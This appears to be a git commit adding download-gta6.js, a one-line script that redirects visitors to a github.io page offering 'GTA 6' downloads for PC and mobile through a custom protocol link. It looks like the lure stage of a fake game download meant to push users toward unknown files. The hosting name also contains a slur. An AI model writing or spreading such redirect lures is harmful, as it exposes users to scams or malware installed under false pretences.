dcd76c0f1be68af15c203be3e9088971c119ac40
link-short <dora.family228@gmail.com>
2026-09-07 17:36:51 +0300

    Create download-gta6.js

---
+++ v/cyberinr.con/download-gta6.js
@@ -0,0 +1,1 @@
+window.location.href = "https://you-are-fat-gay2008.github.io/pages/v/api/userapp/?app_file_pc=https://you-are-fat-gay2008.github.io/pages/v/cyberihr.com/download-pc&amp;app_file_mobile=https://you-are-fat-gay2008.github.io/pages/v/cyberihr.com/download-mobile&amp;pc=cyberihr://gta6&amp;mobile=cyberihr://gta6";
